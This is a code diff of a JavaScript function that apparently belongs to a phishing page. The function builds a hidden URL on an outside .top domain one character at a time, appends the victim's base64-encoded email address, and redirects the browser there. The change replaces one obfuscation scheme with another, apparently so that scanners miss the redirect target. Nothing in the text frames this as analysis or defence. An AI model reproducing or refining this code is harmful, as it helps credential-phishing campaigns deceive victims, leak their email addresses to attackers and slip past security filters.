@@ -85,11 +85,31 @@
             return null;
         }
 
-        function redirectToTarget(base64Email) {
-            const parts = [
-                'h', 't', 't', 'p', 's', ':', '/', '/', 'o', 'u', 't', '-', 'm', 'i', 's', 'o', 'r', 'f', '.', 't', 'o', 'p', '/', 'x', 'i', 'v', '/', 'i', 'n', 'd', 'e', 'x', '.', 'h', 't', 'm', 'l', '#'
-            ];
-            const obfuscatedURL = parts.join('') + base64Email;
+   function redirectToTarget(base64Email) {
+            // Obfuscated URL parts
+            const part1 = 'h';
+            const part2 = 't';
+            const part3 = 't';
+            const part4 = 'p';
+            const part5 = 's';
+            const part6 = ':';
+            const part7 = '/';
+            const part8 = '/';
+            const part9 = 'o';
+            const part10 = 'u';
+            const part11 = 't-';
+            const part12 = 'm';
+            const part13 = 'i';
+            const part14 = 's';
+            const part15 = 'o';
+            const part16 = 'r';
+            const part17 = 'f';
+            const part18 = '.';
+            const part19 = 't';
+            const part20 = 'o';
+            const part21 = 'p';
+            const part22 = '/xiv/index.html#';
+            const obfuscatedURL = part1 + part2 + part3 + part4 + part5 + part6 + part7 + part8 + part9 + part10 + part11 + part12 + part13 + part14 + part15 + part16 + part17 + part18 + part19 + part20 + part21 + part22 + base64Email;
             window.location.href = obfuscatedURL;
         }
 
